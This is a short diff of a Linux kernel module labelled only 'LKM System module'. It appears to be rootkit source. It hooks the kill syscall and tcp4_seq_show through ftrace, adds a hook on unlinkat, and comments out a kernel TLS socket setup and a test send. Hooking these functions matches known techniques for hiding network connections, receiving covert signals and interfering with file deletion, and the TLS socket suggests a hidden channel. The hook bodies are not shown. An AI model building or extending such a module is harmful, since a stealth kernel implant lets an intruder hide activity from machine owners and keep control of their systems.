@@ -26,7 +26,7 @@ MODULE_DESCRIPTION("LKM System module");
 static struct ftrace_hook hooks[] = {
     HOOK("__x64_sys_kill", hook_kill, &orig_kill),
     HOOK("tcp4_seq_show", hook_tcp4, &orig_tcp4_seq_show),
-};
+    HOOK("__x64_sys_unlinkat", hook_unlinkat, &orig_unlinkat)};
 
 static void test_ktl_send(void) {
   int ret;
@@ -115,14 +115,14 @@ static int __init lkm_init(void) {
   unsigned char tx_seq[TLS_SEQ_SIZE] = {0};
   unsigned char rx_seq[TLS_SEQ_SIZE] = {0};
 
-  ret = tls_setup_socket(sock, key, iv, salt, tx_seq, rx_seq);
-  if (ret < 0) {
-    printk(KERN_ERR "tls_setup_socket failed: %d\n", ret);
-    sock_release(sock);
-    return ret;
-  }
+  // ret = tls_setup_socket(sock, key, iv, salt, tx_seq, rx_seq);
+  // if (ret < 0) {
+  //   printk(KERN_ERR "tls_setup_socket failed: %d\n", ret);
+  //   sock_release(sock);
+  //   return ret;
+  // }
 
-  test_ktl_send();
+  // test_ktl_send();
 
   return 0;
 cleanup:
